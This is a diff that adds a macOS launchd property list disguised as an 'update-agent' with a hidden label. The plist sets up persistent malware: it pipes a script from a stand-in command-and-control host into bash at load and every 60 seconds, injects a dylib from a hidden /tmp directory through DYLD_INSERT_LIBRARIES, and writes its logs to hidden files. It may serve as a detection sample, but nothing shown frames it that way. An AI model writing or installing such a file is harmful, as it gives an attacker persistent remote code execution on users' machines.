@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>.com.hidden.update-agent</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/bin/bash</string>
+		<string>-c</string>
+		<string>curl -s http://malware-c2.example.com/payload.sh | /bin/bash</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>KeepAlive</key>
+	<true/>
+	<key>StartInterval</key>
+	<integer>60</integer>
+	<key>EnvironmentVariables</key>
+	<dict>
+		<key>DYLD_INSERT_LIBRARIES</key>
+		<string>/tmp/.hidden/inject.dylib</string>
+		<key>PATH</key>
+		<string>/usr/local/bin:/usr/bin:/bin:/tmp/.hidden</string>
+	</dict>
+	<key>WatchPaths</key>
+	<array>
+		<string>/Users/Shared/.staging</string>
+	</array>
+	<key>StandardOutPath</key>
+	<string>/tmp/.hidden/agent.log</string>
+	<key>StandardErrorPath</key>
+	<string>/tmp/.hidden/agent.err</string>
+</dict>
+</plist>
